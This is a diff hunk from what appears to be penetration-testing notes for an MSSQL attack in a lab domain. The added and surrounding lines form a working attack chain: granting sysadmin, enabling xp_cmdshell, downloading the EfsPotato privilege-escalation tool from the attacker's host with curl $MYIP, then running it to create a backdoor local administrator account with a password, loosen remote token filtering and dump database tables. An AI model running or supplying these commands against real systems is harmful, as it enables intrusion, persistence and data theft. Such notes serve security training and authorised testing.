@@ -824,7 +824,8 @@ SELECT name, type_desc FROM sys.server_principals WHERE type = 'R' AND is_fixed_
 EXEC master.dbo.sp_addsrvrolemember @loginame = 'RLAB\epugh_adm', @rolename = 'sysadmin';
 enable_xp_cmdshell
 upload /Upload/windows/EfsPotato.exe C:\Windows\Tasks\EfsPotato.exe
-xp_cmdshell C:\Windows\Tasks\EfsPotato.exe "powershell -c \"Invoke-Command -ScriptBlock { whoami /priv; arp /a; ipconfig /all }\""
+xp_cmdshell powershell -c curl $MYIP/windows/EfsPotato.exe -o \windows\tasks\EfsPotato.exe
+xp_cmdshell C:\Windows\Tasks\EfsPotato.exe "powershell -c \"Invoke-Command -ScriptBlock { whoami /priv; arp /a; ipconfig /all; whoami; hostname }\""
 xp_cmdshell C:\Windows\Tasks\EfsPotato.exe "powershell -c \"Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }\""
 SELECT table_name,table_schema from [databasename].INFORMATION_SCHEMA.TABLES;
 SELECT * FROM [databasename].[dbo].[tablename];
